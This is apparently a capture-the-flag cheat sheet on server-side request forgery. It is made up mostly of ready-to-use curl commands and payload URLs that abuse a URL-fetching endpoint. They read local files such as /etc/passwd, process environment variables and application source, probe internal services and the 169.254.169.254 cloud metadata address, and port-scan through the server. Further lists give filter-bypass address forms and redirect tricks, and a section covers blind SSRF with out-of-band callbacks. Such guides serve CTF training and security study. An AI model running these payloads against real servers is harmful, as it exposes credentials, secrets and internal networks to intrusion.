# SSRF — Server-Side Request Forgery (CWE-918)

**Signs**: the server fetches a URL you give it — link preview, image proxy, "import from URL",
webhooks, PDF generators, avatar by URL. Hint "the courier checks no papers, any road it will take".

## 1. Local files via other schemes (often the fastest flag)
```bash
curl -s -d 'url=file:///flag/flag' $T/preview
curl -s -d 'url=file:///etc/passwd' $T/preview
curl -s -d 'url=file:///proc/self/environ' $T/preview        # env vars (FLAG=?)
curl -s -d 'url=file:///proc/self/cwd/app.py' $T/preview     # source code
```
PHP `file_get_contents` also: `php://filter/convert.base64-encode/resource=index.php`, `data://`,
`expect://`. Python `urllib`: `file://`. curl-based: `gopher://`, `dict://`, `ftp://`.

## 2. Internal services
```bash
for u in http://127.0.0.1/ http://localhost:8080/admin http://127.0.0.1:5000/ \
         http://169.254.169.254/latest/meta-data/ http://[::1]/ http://0/ ; do
  echo "== $u"; curl -s -d "url=$u" $T/preview | head -5; done
```
Port scan through it: `ffuf -u $T/preview -X POST -d 'url=http://127.0.0.1:FUZZ/' -w wordlists/fuzz/common-ports.txt -fs <closed_size>`.

## 3. Filter bypasses (when `127.0.0.1`/`localhost`/`file` blocked)
`http://2130706433/` (decimal), `http://0x7f000001/`, `http://127.1/`, `http://0.0.0.0/`,
`http://[::ffff:127.0.0.1]/`, `http://localtest.me/` (resolves to 127.0.0.1),
`http://evil.com@127.0.0.1/`, `http://127.0.0.1#@allowed.com/`, redirect from your server
(`302 Location: file:///flag/flag`), `FILE://`, `file:/flag/flag`, `file://localhost/flag/flag`.

## 4. Blind SSRF
No response body → confirm with a callback to your listener ([oob-listeners](../tools/oob-listeners.md)).
Use it to hit internal endpoints that *act* (admin actions via GET).

Seen in: `inj9` (PicLink: PHP `file_get_contents($url)` returns `file:///flag/flag` as "image"),
`sqli7` (app fetches every URL the SQL returns → [out-of-band](../06-sqli/out-of-band.md)).
